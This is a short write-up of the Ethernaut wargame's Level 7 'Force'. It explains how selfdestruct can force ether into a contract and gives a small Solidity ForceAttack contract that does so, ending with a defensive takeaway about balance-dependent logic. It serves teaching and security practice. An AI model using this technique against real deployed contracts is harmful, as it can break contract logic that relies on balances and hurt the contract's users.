<div align="center">

<img src="../assets/levels/7-force.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 7 - Force</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
- [Solution](#solution)
- [Takeaway](#takeaway)

## Objectif

<img src="../assets/requirements/7-force-requirements.webp" width="800px"/>

## The hack

It requires the use of `selfdestruct` - which is one of the ways to forcibly send ether to a contract

## Solution

Write and deploy a contract that takes the address of the vulnerable contract and call's selfDestruct on itself - forwarding any ether in it to the vulnerable contract

```
contract ForceAttack {

    function attack(address payable _vulnerableContract) public payable {
        require(msg.value > 0);
        selfdestruct(_vulnerableContract);
    }
}
```

## Takeaway

selfdestuct's existence and that contracts should be vvary of using logic tied to their balance

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
